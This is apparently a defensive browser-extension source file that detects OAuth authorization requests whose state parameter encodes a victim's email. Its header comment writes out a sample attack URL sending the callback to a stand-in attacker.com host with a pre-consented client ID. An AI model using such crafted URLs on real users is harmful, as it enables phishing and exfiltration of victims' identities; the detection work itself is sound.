/**
 * packages/extension/oauthguard/detectors/state_parameter_abuse.js
 *
 * OAuthGuard — OAuth state parameter email encoding detector.
 *
 * Threat context (Microsoft, March 2, 2026):
 *   Attackers encode the victim's email address in base64 and inject it as the OAuth
 *   `state` parameter in a crafted authorization URL. When the victim authenticates,
 *   the OAuth callback delivers the decoded email back to the attacker's redirect_uri —
 *   a clean exfil channel that rides legitimate OAuth infrastructure and bypasses all
 *   content-level filters.
 *
 *   Canonical attack URL:
 *     https://login.microsoftonline.com/common/oauth2/authorize
 *       ?client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46   ← Azure CLI (pre-consented)
 *       &response_type=code
 *       &redirect_uri=https://attacker.com/callback
 *       &state=dmljdGltQGNvcnAuY29t                        ← base64("victim@corp.com")
 *       &scope=openid profile email offline_access
 *
 * Fires on: chrome.webRequest.onBeforeRequest for OAuth authorization endpoint URLs.
 *
 * References:
 *   - Microsoft Security Blog, March 2, 2026
 *   - MSTIC Storm-2372 (device code flow + state abuse combination)
 */

'use strict';

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/**
 * OAuth authorization endpoints this detector monitors.
 * Checked against urlObj.hostname (exact match or suffix match for paths like github.com/login/oauth).
 */
const OAUTH_AUTH_ENDPOINTS = [
  'login.microsoftonline.com',
  'accounts.google.com',
  'login.live.com',
  'auth.apple.com',
  'github.com',
  'login.salesforce.com',
  'login.okta.com',
  'login.windows.net',
];

/**
 * RFC 5322 simplified email regex.
 * Intentionally permissive — false negatives (missed emails) are worse than
 * false positives here because we only alert when the state param decodes cleanly.
 */
const EMAIL_REGEX = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/;

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

/**
 * Check whether a string looks like an email address.
 *
 * @param {string} str
 * @returns {boolean}
 */
function looksLikeEmail(str) {
  return EMAIL_REGEX.test(str.trim());
}

/**
 * Attempt to decode a state parameter value using multiple encoding strategies.
 * Tries base64 (including URL-safe variant), hex, and URL percent-encoding.
 *
 * @param {string} rawValue - Raw state parameter value (already URL-decoded by URLSearchParams)
 * @returns {{ decoded: string, method: string } | null}
 */
function tryDecode(rawValue) {
  if (!rawValue || rawValue.length < 4) {
    return null;
  }

  // ---- Strategy 1: Base64 (standard and URL-safe variant) ---- //
  try {
    // Normalise URL-safe base64 (- → +, _ → /) and restore padding
    const normalised = rawValue
      .replace(/-/g, '+')
      .replace(/_/g, '/')
      .replace(/[^A-Za-z0-9+/=]/g, '');  // strip any remaining URL-unsafe chars

    // Restore padding to a multiple of 4
    const padded = normalised + '='.repeat((4 - (normalised.length % 4)) % 4);
    const decoded = atob(padded);

    // Require printable ASCII — binary data is not an email
    if (decoded && /^[\x20-\x7E]+$/.test(decoded)) {
      console.debug('[STATE_ABUSE] tryDecode base64 succeeded decoded=%s', decoded.substring(0, 64));
      return { decoded: decoded.trim(), method: 'base64' };
    }
  } catch (_) {
    // atob() throws on invalid base64 — fall through to next strategy
  }

  // ---- Strategy 2: Hex encoding ---- //
  if (/^[0-9a-f]{8,}$/i.test(rawValue)) {
    try {
      const decoded = rawValue
        .match(/.{1,2}/g)
        .map(byte => String.fromCharCode(parseInt(byte, 16)))
        .join('');
      if (decoded && /^[\x20-\x7E]+$/.test(decoded)) {
        console.debug('[STATE_ABUSE] tryDecode hex succeeded decoded=%s', decoded.substring(0, 64));
        return { decoded: decoded.trim(), method: 'hex' };
      }
    } catch (_) {
      // Fall through
    }
  }

  // ---- Strategy 3: URL percent-encoding ---- //
  if (rawValue.includes('%')) {
    try {
      const decoded = decodeURIComponent(rawValue);
      if (decoded !== rawValue) {
        console.debug('[STATE_ABUSE] tryDecode url-encode succeeded decoded=%s', decoded.substring(0, 64));
        return { decoded: decoded.trim(), method: 'url' };
      }
    } catch (_) {
      // decodeURIComponent throws on malformed sequences — fall through
    }
  }

  return null;
}

// ---------------------------------------------------------------------------
// Main detector
// ---------------------------------------------------------------------------

/**
 * @typedef {Object} StateAbuseResult
 * @property {boolean}  detected
 * @property {string}   type           - 'OAUTH_STATE_EMAIL_ENCODED' when detected, '' otherwise
 * @property {string}   decodedEmail   - The email decoded from the state parameter
 * @property {string}   stateValue     - First 64 chars of the raw state parameter (PII-truncated)
 * @property {string}   encodingMethod - 'base64' | 'hex' | 'url' | ''
 * @property {number}   riskScore      - 0.85 when detected, 0.0 otherwise
 * @property {string[]} signals        - Human-readable signal list (always populated)
 */

/**
 * Detect OAuth state parameter email encoding in an authorization request URL.
 *
 * @param {string} url - Full URL from webRequest.onBeforeRequest details.url
 * @returns {StateAbuseResult}
 *
 * Guarantees:
 *   - Never throws. All errors return { detected: false, signals: ['detector_error'] }
 *   - signals is always a non-empty array
 *   - decodedEmail, stateValue, encodingMethod are '' when detected=false
 */
export function detectStateParameterAbuse(url) {
  /** @type {StateAbuseResult} */
  const CLEAN = (signals) => ({
    detected: false,
    type: '',
    decodedEmail: '',
    stateValue: '',
    encodingMethod: '',
    riskScore: 0.0,
    signals,
  });

  try {
    console.debug('[STATE_ABUSE] Checking url=%s', url ? url.substring(0, 120) : '(empty)');

    if (!url || typeof url !== 'string') {
      return CLEAN(['no_url']);
    }

    // ------------------------------------------------------------------ //
    // Step 1 — Parse URL
    // ------------------------------------------------------------------ //
    let urlObj;
    try {
      urlObj = new URL(url);
    } catch (_) {
      console.debug('[STATE_ABUSE] URL parse failed url=%s', url.substring(0, 80));
      return CLEAN(['url_parse_error']);
    }

    // ------------------------------------------------------------------ //
    // Step 2 — Check OAuth endpoint
    // ------------------------------------------------------------------ //
    const hostname = urlObj.hostname.toLowerCase();
    const isOAuthEndpoint = OAUTH_AUTH_ENDPOINTS.some(ep => hostname === ep || hostname.endsWith('.' + ep));

    if (!isOAuthEndpoint) {
      console.debug('[STATE_ABUSE] Not an OAuth endpoint — skipping hostname=%s', hostname);
      return CLEAN(['not_oauth_endpoint']);
    }

    // ------------------------------------------------------------------ //
    // Step 3 — Extract state parameter
    // ------------------------------------------------------------------ //
    const stateValue = urlObj.searchParams.get('state');
    if (!stateValue || stateValue.length < 4) {
      return CLEAN(['no_state_param']);
    }

    console.debug('[STATE_ABUSE] state param found stateValue=%s...', stateValue.substring(0, 32));

    // ------------------------------------------------------------------ //
    // Step 4 — Attempt to decode
    // URLSearchParams.get() automatically percent-decodes the value.
    // This means a state= of "user%40corp.com" arrives here already decoded
    // to "user@corp.com". Check for the pre-decoded email FIRST, then try
    // explicit encoding strategies for base64 and hex variants.
    // ------------------------------------------------------------------ //

    // Fast path: URLSearchParams already decoded a percent-encoded email
    if (looksLikeEmail(stateValue)) {
      const decodedEmail = stateValue.trim();
      console.warn(
        '[STATE_ABUSE] ALERT email_in_state_param (url-encoded, pre-decoded) email=%s url=%s',
        decodedEmail, url.substring(0, 120),
      );
      return {
        detected: true,
        type: 'OAUTH_STATE_EMAIL_ENCODED',
        decodedEmail,
        stateValue: stateValue.substring(0, 64),
        encodingMethod: 'url',
        riskScore: 0.85,
        signals: [
          `email_in_state_param:${decodedEmail}`,
          'encoding:url',
          `oauth_endpoint:${hostname}`,
        ],
      };
    }

    const decodeResult = tryDecode(stateValue);
    if (!decodeResult) {
      return CLEAN(['state_not_decodable']);
    }

    console.debug(
      '[STATE_ABUSE] decoded state method=%s value=%s',
      decodeResult.method,
      decodeResult.decoded.substring(0, 64),
    );

    // ------------------------------------------------------------------ //
    // Step 5 — Check if decoded value is an email address
    // ------------------------------------------------------------------ //
    if (!looksLikeEmail(decodeResult.decoded)) {
      console.debug('[STATE_ABUSE] decoded value is not email — clean value=%s',
        decodeResult.decoded.substring(0, 32));
      return CLEAN(['state_decoded_not_email']);
    }

    // ------------------------------------------------------------------ //
    // Step 6 — Alert: email confirmed in state parameter
    // ------------------------------------------------------------------ //
    const decodedEmail = decodeResult.decoded.trim();
    console.warn(
      '[STATE_ABUSE] ALERT email_in_state_param email=%s method=%s url=%s',
      decodedEmail,
      decodeResult.method,
      url.substring(0, 120),
    );

    return {
      detected: true,
      type: 'OAUTH_STATE_EMAIL_ENCODED',
      decodedEmail,
      stateValue: stateValue.substring(0, 64),  // truncate PII
      encodingMethod: decodeResult.method,
      riskScore: 0.85,
      signals: [
        `email_in_state_param:${decodedEmail}`,
        `encoding:${decodeResult.method}`,
        `oauth_endpoint:${hostname}`,
      ],
    };

  } catch (err) {
    console.error('[STATE_ABUSE] unexpected error url=%s err=%s', url ? url.substring(0, 80) : '', err);
    return {
      detected: false,
      type: '',
      decodedEmail: '',
      stateValue: '',
      encodingMethod: '',
      riskScore: 0.0,
      signals: ['detector_error'],
    };
  }
}
